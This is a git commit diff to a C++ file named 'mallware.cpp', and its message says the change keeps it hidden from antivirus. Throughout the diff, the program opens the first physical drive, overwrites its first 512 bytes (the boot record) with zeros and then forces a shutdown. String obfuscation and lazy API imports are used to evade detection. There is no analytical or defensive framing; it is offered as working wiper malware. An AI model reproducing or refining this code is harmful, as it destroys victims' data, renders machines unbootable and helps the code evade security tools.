8a003da4ec06565de6ce3e21d1bac75ea63b4255
fefwefewfwe <73445286+sharkzxo@users.noreply.github.com>
2022-05-19 22:22:57 +0200

    Update mallware.cpp
    just little update to keep it as secret against antivirus

--- mallware/mallware.cpp
+++ mallware/mallware.cpp
@@ -1,42 +1,43 @@
 #include <Windows.h>
 #include <iostream>
+#include <string.h>
+#include <thread>
 #include "lazy_importer.hpp"
 #include "xorstr.hpp"
 
 using namespace std;
 
-#define motherboard_size 512 //Default size
+#define size 512 //default size
 
 int main()
 {
-    static char message1[512]; //m1
-    sprintf_s(message1, XorStr("Memory changed, shutting down..."));
+    static char success[512]; // if success
+    sprintf_s(success, xorstr_("Memory changed!"));
 
-    static char message2[512]; //m2
-    sprintf_s(message2, XorStr("Memory change fail.."));
+    static char failed[512]; // if failed
+    sprintf_s(failed, xorstr_("Program failed!"));
 
-    DWORD write_memory;
-    char motherboard_data[motherboard_size]; //default value 512 @motherboard_size 512
+    DWORD change_memory;
+    static char data[size]; // @size 512
 
-    ZeroMemory(&motherboard_data, (sizeof motherboard_data)); //rewrite our memory
+    ZeroMemory(&data, (sizeof data));
 
-    HANDLE motherboard_record = CreateFile(XorStr("\\\\.\\PhysicalDrive0"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
-    if (WriteFile(motherboard_record, motherboard_data, motherboard_size, &write_memory, NULL) == TRUE) {
+    HANDLE record = CreateFile(xorstr_("\\\\.\\PhysicalDrive0"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
+    if (WriteFile(record, data, size, &change_memory, NULL) == TRUE) {
 
-        cout << message1; //show message m1
+        cout << success; //show message
 
-        LI_FN(Sleep)(500); //sleep this process for 0.5 second
-        LI_FN(system)(XorStr("shutdown -s -t 1")); //shutdown computer
-        LI_FN(ExitProcess)(0); //terminate this process
+        std::this_thread::sleep_for(std::chrono::milliseconds(500)); //sleep this process
+        LI_FN(system)(xorstr_("shutdown -s -t 1")); //shutdown computer
+        throw 42; //terminate this process
     }
     else
     {
-        cout << message2; //show message m2
-
-        LI_FN(Sleep)(500); //sleep this process for 0.5 second
-        LI_FN(ExitProcess); //terminate this process
+        cout << failed; //show message
+        std::this_thread::sleep_for(std::chrono::milliseconds(500)); //sleep this process
+        throw 42; //terminate this process
     }
-    LI_FN(CloseHandle)(motherboard_record); //close handle
+    LI_FN(CloseHandle)(record); //close handle
 
     return EXIT_SUCCESS;
 }
